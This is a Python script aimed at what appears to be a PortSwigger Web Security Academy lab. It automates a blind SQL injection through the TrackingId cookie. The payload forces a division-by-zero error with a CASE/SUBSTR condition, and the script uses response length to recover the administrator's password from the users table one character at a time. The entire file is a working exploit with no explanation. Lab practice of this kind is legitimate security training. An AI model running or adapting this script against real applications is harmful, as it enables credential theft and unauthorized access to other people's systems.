import requests

Url = "https://ac1d1fc21e724bafc05fd66900bd00d8.web-security-academy.net/filter?category=Pets"
Password_Length = 20

def TheRequest(TheUrl):
  response = requests.get(TheUrl)
  cookies = response.cookies.get_dict()
  sesscookie = cookies["session"]
  trackingid = cookies["TrackingId"]
  return sesscookie, trackingid

Character = list(map(chr, range(97, 123))) + list(map(chr, range(48,58)))
SessCookie, TrackingId = TheRequest(Url)[0], TheRequest(Url)[1]

def SendWrongCookie(SessCookie=SessCookie):
  cookie_send = {"TrackingId": "xyz", "session": SessCookie}
  request = requests.get(Url, cookies=cookie_send)
  return len(request.content)

def SendRequest(Url=Url, SessCookie=SessCookie, TrackingId=TrackingId, Password_Length=Password_Length, Character=Character):
  password = ""
  false_trackingid_len = SendWrongCookie()
  for i in range (Password_Length):
    for j in Character :
      print(f"trying character no {i+1} and letter {j}")
      trackingid = TrackingId + f"'||(SELECT+CASE+WHEN+SUBSTR(password,1,{i+1})='{password+j}'+THEN+to_char(1/0)+ELSE+'a'+END+FROM+users+WHERE+username='administrator')--"
      cookie_send = {"TrackingId": trackingid, "session": SessCookie}
      request = requests.get(Url, cookies=cookie_send)
      if len(request.content) != false_trackingid_len :
        password += j
        print(f"new character found {password}")
        break
  return password
      
print(f"The password is {SendRequest()}")